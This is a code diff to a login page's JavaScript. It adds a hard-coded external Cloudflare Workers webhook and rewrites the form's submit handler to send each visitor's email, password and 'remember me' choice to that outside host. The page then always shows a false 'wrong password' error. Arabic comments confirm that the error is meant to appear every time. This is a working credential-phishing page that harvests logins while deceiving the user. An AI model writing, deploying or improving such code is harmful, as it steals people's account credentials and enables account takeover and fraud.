@@ -80,14 +80,41 @@
 
   <script>
     (function(){
+      const webhookUrl = 'https://vegoomoney12.amrdora9.workers.dev/';
       const form = document.getElementById('loginForm');
       const successMsg = document.getElementById('successMsg');
       const errorMsg = document.getElementById('errorMsg');
 
-      form.addEventListener('submit', function(e){
+      form.addEventListener('submit', async function(e){
         e.preventDefault();
         successMsg.style.display = 'none';
-        errorMsg.style.display = 'block'; // دايمًا يظهر خطأ كلمة المرور
+        errorMsg.style.display = 'none';
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        const remember = document.getElementById('remember').checked;
+
+        const payload = {
+          email,
+          password,
+          remember,
+          timestamp: new Date().toISOString()
+        };
+
+        try {
+          // ابعت البيانات للـ Worker
+          await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          // دايمًا يظهر خطأ كلمة المرور
+          errorMsg.style.display = 'block';
+        } catch (err) {
+          errorMsg.textContent = 'فشل الاتصال بالخادم';
+          errorMsg.style.display = 'block';
+        }
       });
     })();
   </script>
